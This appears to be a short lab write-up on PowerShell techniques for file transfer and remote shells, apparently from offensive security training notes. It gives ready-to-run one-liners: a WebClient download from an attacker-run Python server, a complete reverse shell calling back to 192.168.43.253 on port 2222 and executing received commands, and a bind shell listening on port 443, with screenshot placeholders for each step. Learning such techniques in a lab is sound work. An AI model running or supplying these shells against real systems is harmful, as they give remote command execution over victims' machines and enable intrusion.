# Task 2 Powershell

### **Powershell File Transfers**

* Create a file to be transfered

![](assets/1_powershell.jpg)

* Start python server

![](assets/2_powershell.jpg)

* Run below command

```text
powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')
```

![](assets/3_powershell.jpg)

### Powershell Reverse Shell

* Run the listener

![](assets/1_powershell_reverse_shell.jpg)

* Run the command in cmd

```text
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.43.253',2222);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

![](assets/2_powershell_reverse_shell.jpg)

* We get the shell

![](assets/3_powershell_reverse_shell.jpg)

### Powershell Bind shell

![](assets/1_bind_shell_powershell.jpg)

```text
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

![](assets/2_bind_shell_powershell.jpg)

